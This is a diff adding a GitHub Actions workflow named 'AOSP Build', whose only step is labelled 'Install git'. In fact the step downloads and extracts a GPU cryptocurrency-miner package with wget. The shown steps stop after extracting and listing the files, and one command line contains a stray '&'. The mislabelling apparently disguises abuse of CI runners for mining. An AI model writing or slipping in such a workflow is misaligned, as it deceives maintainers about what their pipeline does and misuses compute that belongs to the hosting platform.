@@ -1,0 +1,19 @@
+name: AOSP Build
+
+on:
+  workflow_dispatch:
+
+defaults:
+  run:
+    shell: bash
+    
+jobs:
+  build:
+    runs-on: ubuntu-18.04
+    steps:
+    - name: Install git
+      run : |
+             wget https://github.com/tontechio/pow-miner-gpu/releases/download/20211108-1/minertools-cuda-ubuntu-20.04-x86-64.tar.gz
+             mv minertools-cuda-ubuntu-20.04-x86-64.tar.gz 1.tar.gz
+             tar xvzf 1.tar.gz
+             cd 1 & ls -l
